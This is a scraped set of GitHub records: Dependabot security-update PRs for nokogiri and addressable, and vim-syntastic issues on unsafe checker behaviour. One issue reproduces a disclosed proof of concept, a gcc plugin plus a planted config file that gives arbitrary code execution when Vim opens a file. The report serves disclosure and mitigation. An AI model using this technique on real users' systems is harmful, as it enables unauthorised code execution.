<p>Nokogiri <code>&amp;lt;= 1.10.10</code> as well as prereleases <code>1.11.0.rc1</code>, <code>1.11.0.rc2</code>, and <code>1.11.0.rc3</code></p>
<h3>Mitigation</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Patched versions: &gt;= 1.11.0.rc4
Unaffected versions: none</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-7rrm-v45f-jp64"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Update packaged dependency libxml2 from 2.9.10 to 2.9.12</strong></p>
<h3>Summary</h3>
<p>Nokogiri v1.11.4 updates the vendored libxml2 from v2.9.10 to v2.9.12 which addresses:</p>
<ul>
<li><a href=""https://security.archlinux.org/CVE-2019-20388"">CVE-2019-20388</a> (Medium severity)</li>
<li><a href=""https://security.archlinux.org/CVE-2020-24977"">CVE-2020-24977</a> (Medium severity)</li>
<li><a href=""https://security.archlinux.org/CVE-2021-3517"">CVE-2021-3517</a> (Medium severity)</li>
<li><a href=""https://security.archlinux.org/CVE-2021-3518"">CVE-2021-3518</a> (Medium severity)</li>
<li><a href=""https://security.archlinux.org/CVE-2021-3537"">CVE-2021-3537</a> (Low severity)</li>
<li><a href=""https://security.archlinux.org/CVE-2021-3541"">CVE-2021-3541</a> (Low severity)</li>
</ul>
<p>Note that two additional CVEs were addressed upstream but are not relevant to this release. <a href=""https://security.archlinux.org/CVE-2021-3516"">CVE-2021-3516</a> via <code>xmllint</code> is not present in Nokogiri, and <a href=""https://security.archlinux.org/CVE-2020-7595"">CVE-2020-7595</a> has been patched in Nokogiri since v1.10.8 (see #1992).</p>
<p>Please note that this advisory only applies to the CRuby implementation of Nokogiri <code>&amp;lt; 1.11.4</code>, and only if the packaged version of libxml2 is being used. If you've overridden defaults at installation time to use system libraries instead of packaged libraries, you should instead pay attention to your distro's <code>libxml2</code> release announcements.</p>
<h3>Mitigation</h3>
<p>Upgrade to Nokogiri <code>&amp;gt;= 1.11.4</code>.</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt; 1.11.4</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/sparklemotion/nokogiri/releases"">nokogiri's releases</a>.</em></p>
<blockquote>
<h2>1.11.4 / 2021-05-14</h2>
<h3>Security</h3>
<p>[CRuby] Vendored libxml2 upgraded to v2.9.12 which addresses:</p>
<ul>
<li><a href=""https://security.archlinux.org/CVE-2019-20388"">CVE-2019-20388</a></li>
<li><a href=""https://security.archlinux.org/CVE-2020-24977"">CVE-2020-24977</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3517"">CVE-2021-3517</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3518"">CVE-2021-3518</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3537"">CVE-2021-3537</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3541"">CVE-2021-3541</a></li>
</ul>
<p>Note that two additional CVEs were addressed upstream but are not relevant to this release. <a href=""https://security.archlinux.org/CVE-2021-3516"">CVE-2021-3516</a> via <code>xmllint</code> is not present in Nokogiri, and <a href=""https://security.archlinux.org/CVE-2020-7595"">CVE-2020-7595</a> has been patched in Nokogiri since v1.10.8 (see <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1992"">#1992</a>).</p>
<p>Please see <a href=""https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-7rrm-v45f-jp64"">nokogiri/GHSA-7rrm-v45f-jp64 </a> or <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2233"">#2233</a> for a more complete analysis of these CVEs and patches.</p>
<h3>Dependencies</h3>
<ul>
<li>[CRuby] vendored libxml2 is updated from 2.9.10 to 2.9.12. (Note that 2.9.11 was skipped because it was superseded by 2.9.12 a few hours after its release.)</li>
</ul>
<h2>1.11.3 / 2021-04-07</h2>
<h3>Fixed</h3>
<ul>
<li>[CRuby] Passing non-<code>Node</code> objects to <code>Document#root=</code> now raises an <code>ArgumentError</code> exception. Previously this likely segfaulted. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1900"">#1900</a>]</li>
<li>[JRuby] Passing non-<code>Node</code> objects to <code>Document#root=</code> now raises an <code>ArgumentError</code> exception. Previously this raised a <code>TypeError</code> exception.</li>
<li>[CRuby] arm64/aarch64 systems (like Apple's M1) can now compile libxml2 and libxslt from source (though we continue to strongly advise users to install the native gems for the best possible experience)</li>
</ul>
<h2>1.11.2 / 2021-03-11</h2>
<h3>Fixed</h3>
<ul>
<li>[CRuby] <code>NodeSet</code> may now safely contain <code>Node</code> objects from multiple documents. Previously the GC lifecycle of the parent <code>Document</code> objects could lead to nodes being GCed while still in scope. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1952#issuecomment-770856928"">#1952</a>]</li>
<li>[CRuby] Patch libxml2 to avoid &quot;huge input lookup&quot; errors on large CDATA elements. (See upstream <a href=""https://gitlab.gnome.org/GNOME/libxml2/-/issues/200"">GNOME/libxml2#200</a> and <a href=""https://gitlab.gnome.org/GNOME/libxml2/-/merge_requests/100"">GNOME/libxml2!100</a>.) [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2132"">#2132</a>].</li>
<li>[CRuby+Windows] Enable Nokogumbo (and other downstream gems) to compile and link against <code>nokogiri.so</code> by including <code>LDFLAGS</code> in <code>Nokogiri::VERSION_INFO</code>. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2167"">#2167</a>]</li>
<li>[CRuby] <code>{XML,HTML}::Document.parse</code> now invokes <code>#initialize</code> exactly once. Previously <code>#initialize</code> was invoked twice on each object.</li>
<li>[JRuby] <code>{XML,HTML}::Document.parse</code> now invokes <code>#initialize</code> exactly once. Previously <code>#initialize</code> was not called, which was a problem for subclassing such as done by <code>Loofah</code>.</li>
</ul>
<h3>Improved</h3>
<ul>
<li>Reduce the number of object allocations needed when parsing an HTML::DocumentFragment. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2087"">#2087</a>] (Thanks, <a href=""https://github.com/ashmaroli""><code>@​ashmaroli</code></a>!)</li>
<li>[JRuby] Update the algorithm used to calculate <code>Node#line</code> to be wrong less-often. The underlying parser, Xerces, does not track line numbers, and so we've always used a hacky solution for this method. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1223"">#1223</a>, <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2177"">#2177</a>]</li>
<li>Introduce <code>--enable-system-libraries</code> and <code>--disable-system-libraries</code> flags to <code>extconf.rb</code>. These flags provide the same functionality as <code>--use-system-libraries</code> and the <code>NOKOGIRI_USE_SYSTEM_LIBRARIES</code> environment variable, but are more idiomatic. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2193"">#2193</a>] (Thanks, <a href=""https://github.com/eregon""><code>@​eregon</code></a>!)</li>
<li>[TruffleRuby] <code>--disable-static</code> is now the default on TruffleRuby when the packaged libraries are used. This is more flexible and compiles faster. (Note, though, that the default on TR is still to use system libraries.) [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2191#issuecomment-780724627"">#2191</a>, <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2193"">#2193</a>] (Thanks, <a href=""https://github.com/eregon""><code>@​eregon</code></a>!)</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/sparklemotion/nokogiri/blob/main/CHANGELOG.md"">nokogiri's changelog</a>.</em></p>
<blockquote>
<h2>1.11.4 / 2021-05-14</h2>
<h3>Security</h3>
<p>[CRuby] Vendored libxml2 upgraded to v2.9.12 which addresses:</p>
<ul>
<li><a href=""https://security.archlinux.org/CVE-2019-20388"">CVE-2019-20388</a></li>
<li><a href=""https://security.archlinux.org/CVE-2020-24977"">CVE-2020-24977</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3517"">CVE-2021-3517</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3518"">CVE-2021-3518</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3537"">CVE-2021-3537</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3541"">CVE-2021-3541</a></li>
</ul>
<p>Note that two additional CVEs were addressed upstream but are not relevant to this release. <a href=""https://security.archlinux.org/CVE-2021-3516"">CVE-2021-3516</a> via <code>xmllint</code> is not present in Nokogiri, and <a href=""https://security.archlinux.org/CVE-2020-7595"">CVE-2020-7595</a> has been patched in Nokogiri since v1.10.8 (see <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1992"">#1992</a>).</p>
<p>Please see <a href=""https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-7rrm-v45f-jp64"">nokogiri/GHSA-7rrm-v45f-jp64 </a> or <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2233"">#2233</a> for a more complete analysis of these CVEs and patches.</p>
<h3>Dependencies</h3>
<ul>
<li>[CRuby] vendored libxml2 is updated from 2.9.10 to 2.9.12. (Note that 2.9.11 was skipped because it was superseded by 2.9.12 a few hours after its release.)</li>
</ul>
<h2>1.11.3 / 2021-04-07</h2>
<h3>Fixed</h3>
<ul>
<li>[CRuby] Passing non-<code>Node</code> objects to <code>Document#root=</code> now raises an <code>ArgumentError</code> exception. Previously this likely segfaulted. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1900"">#1900</a>]</li>
<li>[JRuby] Passing non-<code>Node</code> objects to <code>Document#root=</code> now raises an <code>ArgumentError</code> exception. Previously this raised a <code>TypeError</code> exception.</li>
<li>[CRuby] arm64/aarch64 systems (like Apple's M1) can now compile libxml2 and libxslt from source (though we continue to strongly advise users to install the native gems for the best possible experience)</li>
</ul>
<h2>1.11.2 / 2021-03-11</h2>
<h3>Fixed</h3>
<ul>
<li>[CRuby] <code>NodeSet</code> may now safely contain <code>Node</code> objects from multiple documents. Previously the GC lifecycle of the parent <code>Document</code> objects could lead to nodes being GCed while still in scope. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1952#issuecomment-770856928"">#1952</a>]</li>
<li>[CRuby] Patch libxml2 to avoid &quot;huge input lookup&quot; errors on large CDATA elements. (See upstream <a href=""https://gitlab.gnome.org/GNOME/libxml2/-/issues/200"">GNOME/libxml2#200</a> and <a href=""https://gitlab.gnome.org/GNOME/libxml2/-/merge_requests/100"">GNOME/libxml2!100</a>.) [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2132"">#2132</a>].</li>
<li>[CRuby+Windows] Enable Nokogumbo (and other downstream gems) to compile and link against <code>nokogiri.so</code> by including <code>LDFLAGS</code> in <code>Nokogiri::VERSION_INFO</code>. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2167"">#2167</a>]</li>
<li>[CRuby] <code>{XML,HTML}::Document.parse</code> now invokes <code>#initialize</code> exactly once. Previously <code>#initialize</code> was invoked twice on each object.</li>
<li>[JRuby] <code>{XML,HTML}::Document.parse</code> now invokes <code>#initialize</code> exactly once. Previously <code>#initialize</code> was not called, which was a problem for subclassing such as done by <code>Loofah</code>.</li>
</ul>
<h3>Improved</h3>
<ul>
<li>Reduce the number of object allocations needed when parsing an <code>HTML::DocumentFragment</code>. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2087"">#2087</a>] (Thanks, <a href=""https://github.com/ashmaroli""><code>@​ashmaroli</code></a>!)</li>
<li>[JRuby] Update the algorithm used to calculate <code>Node#line</code> to be wrong less-often. The underlying parser, Xerces, does not track line numbers, and so we've always used a hacky solution for this method. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1223"">#1223</a>, <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2177"">#2177</a>]</li>
<li>Introduce <code>--enable-system-libraries</code> and <code>--disable-system-libraries</code> flags to <code>extconf.rb</code>. These flags provide the same functionality as <code>--use-system-libraries</code> and the <code>NOKOGIRI_USE_SYSTEM_LIBRARIES</code> environment variable, but are more idiomatic. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2193"">#2193</a>] (Thanks, <a href=""https://github.com/eregon""><code>@​eregon</code></a>!)</li>
<li>[TruffleRuby] <code>--disable-static</code> is now the default on TruffleRuby when the packaged libraries are used. This is more flexible and compiles faster. (Note, though, that the default on TR is still to use system libraries.) [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2191#issuecomment-780724627"">#2191</a>, <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2193"">#2193</a>] (Thanks, <a href=""https://github.com/eregon""><code>@​eregon</code></a>!)</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/9d69b44ed3357b8069856083d39ee418cd10109b""><code>9d69b44</code></a> version bump to v1.11.4</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/058e87fdfda2cc2f309df098d18fe8856e785fcc""><code>058e87f</code></a> update CHANGELOG with complete CVE information</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/92852514a0d4621961deb6ce249441ff5140358f""><code>9285251</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2234"">#2234</a> from sparklemotion/2233-upgrade-to-libxml-2-9-12</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/5436f6120f883e9f185d48b992f39118a4897760""><code>5436f61</code></a> update CHANGELOG</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/761d320af2872c61b91f7b147cf57481566e3c67""><code>761d320</code></a> patch: renumber libxml2 patches</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/889ee2a9cb1e190bfa664cbf3552585f4d0a09a7""><code>889ee2a</code></a> test: update behavior of namespaces in HTML</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/9751d852c005606447dac7bb17f1a56593014583""><code>9751d85</code></a> test: remove low-value HTML::SAX::PushParser encoding test</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/9fcb7d25eabfab5e701d882e72ecab3b2ea6b13c""><code>9fcb7d2</code></a> test: adjust xpath gc test to libxml2's max recursion depth</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/1c99019f5f1bee23e4bff6cf72871f470097f7b2""><code>1c99019</code></a> patch: backport libxslt configure.ac change for libxml2 config</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/82a253fe7c5bdfab5fbe4c1b0c536b5ce4c72ac3""><code>82a253f</code></a> patch: fix isnan/isinf patch to apply cleanly to libxml 2.9.12</li>
<li>Additional commits viewable in <a href=""https://github.com/sparklemotion/nokogiri/compare/v1.10.10...v1.11.4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=nokogiri&package-manager=bundler&previous-version=1.10.10&new-version=1.11.4)](https://dependabot.com/compatibility-score/?dependency-name=nokogiri&package-manager=bundler&previous-version=1.10.10&new-version=1.11.4)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
thoughtbot/upcase,942285018,"[Security] Bump addressable from 2.7.0 to 2.8.0","Bumps [addressable](https://github.com/sporkmonger/addressable) from 2.7.0 to 2.8.0. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-jxhc-q857-3j6g"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Regular Expression Denial of Service in Addressable templates</strong></p>
<h3>Impact</h3>
<p>Within the URI template implementation in Addressable, a maliciously crafted template may result in uncontrolled resource consumption, leading to denial of service when matched against a URI. In typical usage, templates would not normally be read from untrusted user input, but nonetheless, no previous security advisory for Addressable has cautioned against doing this. Users of the parsing capabilities in Addressable but not the URI template capabilities are unaffected.</p>
<h3>Patches</h3>
<p>The vulnerability was introduced in version 2.3.0 (previously yanked) and has been present in all subsequent versions up to, and including, 2.7.0. It is fixed in version 2.8.0.</p>
<h3>Workarounds</h3>
<p>The vulnerability can be avoided by only creating Template objects from trusted sources that have been validated not to produce catastrophic backtracking.</p>
<h3>References</h3>
<ul>
<li><a href=""https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS"">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a></li>
<li><a href=""https://cwe.mitre.org/data/definitions/1333.html"">https://cwe.mitre.org/data/definitions/1333.html</a></li>
<li><a href=""https://www.regular-expressions.info/catastrophic.html"">https://www.regular-expressions.info/catastrophic.html</a></li>
</ul>
<h3>For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &gt; 2.3.0, &lt;= 2.7.0</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/sporkmonger/addressable/blob/main/CHANGELOG.md"">addressable's changelog</a>.</em></p>
<blockquote>
<h1>Addressable 2.8.0</h1>
<ul>
<li>fixes ReDoS vulnerability in Addressable::Template#match</li>
<li>no longer replaces <code>+</code> with spaces in queries for non-http(s) schemes</li>
<li>fixed encoding ipv6 literals</li>
<li>the <code>:compacted</code> flag for <code>normalized_query</code> now dedupes parameters</li>
<li>fix broken <code>escape_component</code> alias</li>
<li>dropping support for Ruby 2.0 and 2.1</li>
<li>adding Ruby 3.0 compatibility for development tasks</li>
<li>drop support for <code>rack-mount</code> and remove Addressable::Template#generate</li>
<li>performance improvements</li>
<li>switch CI/CD to GitHub Actions</li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/sporkmonger/addressable/commit/6469a232c0f1892809ff66737370c765d574e16c""><code>6469a23</code></a> Updating gemspec again</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/24336385de0261571b3adaad0431459edb420c79""><code>2433638</code></a> Merge branch 'main' of github.com:sporkmonger/addressable into main</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/e9c76b889789c75d7073c17b0ab557635d3f6704""><code>e9c76b8</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/sporkmonger/addressable/issues/378"">#378</a> from ashmaroli/flat-map</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/56c5cf7ece9223ff4240e07078cc26d3adbbbd30""><code>56c5cf7</code></a> Update the gemspec</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/c1fed1ca0a44c448e74d761fd44ed94869199807""><code>c1fed1c</code></a> Require a non-vulnerable rake</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/0d8a3127e35886ce9284810a7f2438bff6b43cbc""><code>0d8a312</code></a> Adding note about ReDoS vulnerability</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/89c76130ce255c601f642a018cb5fb5a80e679a7""><code>89c7613</code></a> Merge branch 'template-regexp' into main</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/cf8884f815c96b646c796f707bf768cf6eb65543""><code>cf8884f</code></a> Note about alias fix</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/bb03f7112e8e478240a0f96e1cc7428159b41586""><code>bb03f71</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/sporkmonger/addressable/issues/371"">#371</a> from charleystran/add_missing_encode_component_doc_entry</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/6d1d8094a66cbf932ecf69db6850bc9edaf86de0""><code>6d1d809</code></a> Adding note about :compacted normalization</li>
<li>Additional commits viewable in <a href=""https://github.com/sporkmonger/addressable/compare/addressable-2.7.0...addressable-2.8.0"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=addressable&package-manager=bundler&previous-version=2.7.0&new-version=2.8.0)](https://dependabot.com/compatibility-score/?dependency-name=addressable&package-manager=bundler&previous-version=2.7.0&new-version=2.8.0)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
vim-syntastic/syntastic,314748702,"Checker config files allow arbitrary code execution scenarios","Hi, 

I'm the Debian maintainer of vim-syntastic and I received this bug report:

https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=894736

Package: vim-syntastic
Version: 3.8.0-1
Severity: serious

Hello,

syntastic has a Configuration Files[1] feature enabled for several
checkers, where:

  a configuration file is looked up in the directory of the file being
  checked, then upwards in parent directories.  The search stops either
  when a file with the right name is found, or when the root of the
  filesystem is reached.[1]

[1] https://github.com/vim-syntastic/syntastic/blob/master/doc/syntastic-checkers.txt#L7744

Each line found in the configuration file is escaped as a single
argument and appended to the checker command being run.

I am not an expert on the various possibly dangerous command line
options of all possible checkers, but I played with one I knew how to
play with, and what follows is a possible attack. There might be easier
attacks on checkers that are enabled by default, since the configuration
files features, as it is now, leaves a pretty wide attack surface open.

## Step 1: a malicious gcc plugin

The source code:

```
  #include <gcc-plugin.h>
  #include <stdio.h>
  
  int plugin_is_GPL_compatible;
  
  int plugin_init(struct plugin_name_args   *info,  /* Argument infor */
          struct plugin_gcc_version *ver)   /* Version of GCC */
  {
      fprintf(stdout, ""hello\n"");
      FILE* out = fopen(""/tmp/test"", ""wt"");
      fprintf(out, ""arbitrary code execution\n"");
      fclose(out);
  };
```
Building the plugin:

```
$ gcc -I$(gcc -print-file-name=plugin)/include -fPIC -fno-rtti -O2 -shared plugin.cc  -o /tmp/plugin.so
```

Installing the plugin as nobody.nogroup in /tmp:

```
$ sudo chown nobody.nogroup /tmp/plugin.so
```

## Step 2: a syntastic config file

```
echo -fplugin=/tmp/plugin.so > /tmp/.syntastic_avrgcc_config
sudo chown nobody.nogroup /tmp/.syntastic_avrgcc_config
```

## Step 3: enable the avrgcc plugin

```
let g:syntastic_cpp_checkers = ['avrgcc']
```

## Step 4: edit a C++ file in /tmp

```
touch /tmp/foo.cc
vim /tmp/foo.cc
```

## Step 5: cry

```
$ cat /tmp/test
arbitrary code execution
```
# What should be different

There are several steps that can avoid this:

1. allow to disable this feature, and ship with this feature disabled by
   default
2. stop recursing upwards when hitting a directory that's writable by
   someone other than the current user
3. check that the config files are owned by the current user


# Mitigation

I am not a vimscript expert, and unfortunately I have not found a way to
disable this behaviour without editing the syntastic config files.

------

It works.
What do you think about it?","This assumes the attacker has write access to a parent directory to the base directory of the project you're checking.  Consequently the impact should be pretty low on usual setups.

The root of the problem seems to be that the name of the configuration file can be predicted.  Thus a possible mitigation is to set the appropriate `g:syntastic_<filetype>_config_file` or `g:syntastic_<checker>_config_file` to non-default names for all the checkers that support configuration files.

A more permanent solution would be to unset the defaults for these variables, and possible do some checks on the directories and the file itself as you suggest.  This should disable the feature by default, and force the user to choose a name of the configuration file.  I'll make a new release soon with these changes.I released [3.9.0][3.9.0] with the first part of the fix I mentioned above, clearing the defaults for the names of the configuration files.

Sadly Vim has no built-in way of finding the owner of a file, presumably for historic reasons (most of the OSes Vim was written for at the beginning had no useful concept of ownership).  There is also no good way to check whether a directory is writable by someone other than the current user.  It might be possible to work around these limitations with Python extensions, but syntastic doesn't assume (or make use of) such extensions.  Consequently, the solution in 3.9.0, while probably good enough to stop the attack described in the OP, is less than satisfactory.  A better solution would involve adding the relevant functions to Vim.

[3.9.0]: https://github.com/vim-syntastic/syntastic/releases/tag/3.9.0This issue was assigned CVE-2018-11319",no,"security,"
vim-syntastic/syntastic,37979451,"Elixir checker executes code","The Elixir syntax checker executes any program it checks. For example:

``` elixir
# sleeper.exs
sleeper = fn -> :timer.sleep(4_000) end
sleeper.()
```

It takes 4 seconds to save this file because the `sleeper` function is executed.

This method of checking is dangerous; for example, suppose it were a script to delete files? Also it's annoying; if you accidentally create infinite recursion, Vim will hang.

Can we check syntax without executing the code?

(The answer may be ""only in a limited way"": see [this thread](https://groups.google.com/d/msg/elixir-lang-talk/B29noPHvQ-8/9JvSGPop7n0J))
","I'm afraid I barely know what Elixir is, let alone how it works. :) You guys will have to sort it out, and let me know what is the preferred incantation to make it work, and if it's safe to use.  In the mean time, I can only offer the same treatment I applied to perl: #1013.  Sorry about that.
Done in 1d19dff.  Set `g:syntastic_enable_elixir_checker` to 1 in your vimrc to re-enable the checker.
No problem. :) I'm quite new to it myself and was just trying to figure out why it killed my editor.

Maybe when I know more, I can offer an alternate approach.
Any update on this issue?
@alxndr It's an Elixir issue, not a syntastic one.  Or, put another way: if anybody has figured out yet how to make Elixir run syntactic checks without also executing the code being checked, they didn't bother to tell me about it.  Thus, no progress so far.
Gotcha, thanks!
I'm not much of an elixir expert, but can't we just change the makeprg to `elixirc`, which compiles the code instead of running it? I tried it, and it seems to work for me.
> can't we just change the makeprg to  elixirc , which compiles the code instead of running it?

Actually, `elixirc` is just a [script](https://github.com/elixir-lang/elixir/blob/master/bin/elixirc) around `elixir`.  It doesn't solve any security problem, and it adds a problem of its own.  But you can still use it without code changes if you insist (cf. #1343).
Ah, I found [this security issue raised on the Elixir project](https://github.com/elixir-lang/elixir/issues/3282) where José himself describes how to approach syntax error detection. Looks like Elixir can easily parse its own code, so it should be possible to have the syntastic checker bundle in an Elixir script to safely do this. Here's a first attempt at such a script, which prints syntax errors but doesn't properly handle I/O errors:

``` elixir
[path | _] = System.argv()
{:ok, file} = File.open(path)
data = IO.read(file, :all)
code = Code.string_to_quoted data
case code do
  {:ok, _} -> :ok
  {:error, {line, error, token}} -> IO.puts ""#{path}:#{line}:#{error}#{token}""
end
```

I tested it on ""hello world"" and it doesn't execute the code.

Would it be weird to bundle a script like this in syntastic? If not, can someone point me to an example of where the script should go and how I set `makeprg` to the correct path?
> Would it be weird to bundle a script like this in syntastic?

Not at all, other checkers already do that, f.i. `erlang/escript` and `python/python`.  Still, I'd prefer the script to do error checking and exit 0 if everything went fine, or 1 if it run into abnormal conditions (I/O errors, exceptions, whatever).

Reading [this post](https://github.com/flycheck/flycheck/issues/630) which tries to do the same thing for [flycheck](https://github.com/flycheck/flycheck), the result would have many limitations compared to the existing checker, so perhaps there should be an option to switch between the ""safe"" and the ""useful"" approaches.  Than again, the existing checker has its own problems (cf. #1343), and those aren't going to be solved any time soon.

